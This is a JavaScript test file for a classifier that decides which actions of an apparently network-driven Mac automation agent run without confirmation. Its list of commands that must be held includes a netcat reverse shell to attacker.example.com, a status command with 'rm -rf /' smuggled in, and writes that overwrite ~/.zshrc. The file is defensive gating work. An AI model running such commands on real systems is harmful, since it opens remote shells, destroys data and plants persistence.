import assert from 'node:assert/strict'
import test from 'node:test'
import {
  classifyAction,
  classifyPlan,
  isStatusShellCommand,
} from './actionRisk.js'

// The hands-free path executes without any confirmation, on a command that
// arrived over the network. These are the actions that may take that path.
test('read-only and UI-level actions run hands-free', () => {
  for (const type of [
    'screenshot',
    'zoom',
    'read_file',
    'list_directory',
    'browser_snapshot',
    'browser_list_tabs',
    'browser_wait_for',
    'browser_navigate',
    'browser_click',
    'open_app',
    'open_url',
    'ui_snapshot',
    'ui_click',
    'mouse_click',
    'type_text',
    'press_keys',
    'set_volume',
    'get_clipboard',
  ]) {
    assert.equal(classifyAction({ type }).safe, true, `${type} should auto-run`)
  }
})

test('code execution and file writes never run hands-free', () => {
  for (const type of [
    'run_project',
    'run_applescript',
    'write_file',
    'copy_path',
    'move_path',
    'delete_path',
    'send_email',
    'send_message',
    'computer_use_task',
  ]) {
    const verdict = classifyAction({ type, params: {} })
    assert.equal(verdict.safe, false, `${type} must require confirmation`)
    assert.ok(verdict.reason, `${type} should explain why it is held`)
  }
  // Bare run_shell with no/empty command is held (not a status query).
  assert.equal(
    classifyAction({ type: 'run_shell', params: {} }).safe,
    false,
  )
})

// Status inventory shells (battery, disk, open -a) are hands-free so Realtime
// and full-control plans can answer live Mac questions without a dashboard tap.
test('status run_shell commands auto-run hands-free', () => {
  for (const command of [
    'pmset -g batt',
    'pmset -g',
    'df -h',
    'sw_vers',
    'uname -a',
    'open -a "Microsoft Outlook"',
    'open -a Notes',
    'open https://example.com',
    'system_profiler SPPowerDataType',
    'system_profiler SPHardwareDataType',
    'scutil --nwi',
    'sysctl hw.memsize',
  ]) {
    assert.equal(
      isStatusShellCommand(command),
      true,
      `status shell should match: ${command}`,
    )
    assert.equal(
      classifyAction({ type: 'run_shell', params: { command } }).safe,
      true,
      `status run_shell should auto-run: ${command}`,
    )
  }
  assert.equal(
    classifyPlan([
      { type: 'run_shell', params: { command: 'pmset -g batt' } },
    ]).autoRun,
    true,
  )
})

// The previous gate granted anything that did not match a "looks destructive"
// regex. Every command below is arbitrary code execution and none of them
// contain `rm`, `sudo` or the other tokens that regex looked for.
test('benign-looking shell commands are still held for confirmation', () => {
  for (const command of [
    'find . -delete',
    'chmod -R 777 ~',
    'launchctl load ~/Library/LaunchAgents/x.plist',
    'osascript -e \'tell app "Finder" to quit\'',
    'python3 -c "import os; os.system(\'id\')"',
    'nc attacker.example.com 4444 -e /bin/sh',
    'echo "malicious" > ~/.zshrc',
    'git checkout .',
    'pmset -g batt | sh',
    'pmset -g batt; rm -rf /',
    'sudo pmset -g batt',
    'curl -s https://example.com/x.sh > ~/.zshrc',
  ]) {
    const verdict = classifyAction({ type: 'run_shell', params: { command } })
    assert.equal(verdict.safe, false, `run_shell should be held: ${command}`)
  }
})

test('a benign-looking AppleScript is still held for confirmation', () => {
  const verdict = classifyAction({
    type: 'run_applescript',
    params: { script: 'tell application "System Events" to keystroke "a"' },
  })
  assert.equal(verdict.safe, false)
})

test('unknown action types default to deny', () => {
  assert.equal(classifyAction({ type: 'brand_new_action' }).safe, false)
  assert.equal(classifyAction({}).safe, false)
  assert.equal(classifyAction(null).safe, false)
})

test('one held action blocks the whole plan', () => {
  const verdict = classifyPlan([
    { type: 'screenshot', params: {} },
    { type: 'write_file', params: { path: '~/.zshrc', content: 'evil' } },
  ])

  assert.equal(verdict.autoRun, false)
  assert.deepEqual(
    verdict.blocked.map((entry) => entry.type),
    ['write_file'],
  )
  assert.ok(verdict.reason.length > 0)
})

test('an all-safe plan auto-runs and an empty plan does not', () => {
  assert.equal(
    classifyPlan([{ type: 'screenshot', params: {} }, { type: 'open_app', params: {} }])
      .autoRun,
    true,
  )
  assert.equal(classifyPlan([]).autoRun, false)
  assert.equal(classifyPlan(undefined).autoRun, false)
})

test('Realtime status shell and get_mac_status run hands-free', () => {
  assert.equal(
    classifyAction({
      type: 'run_shell',
      params: { command: 'pmset -g batt' },
    }).safe,
    true,
  )
  assert.equal(
    classifyAction({ type: 'get_battery', params: {} }).safe,
    true,
  )
  assert.equal(
    classifyAction({
      type: 'get_mac_status',
      params: { fields: ['battery'] },
    }).safe,
    true,
  )
  assert.equal(
    classifyPlan([
      { type: 'run_shell', params: { command: 'pmset -g batt' } },
    ]).autoRun,
    true,
  )
})
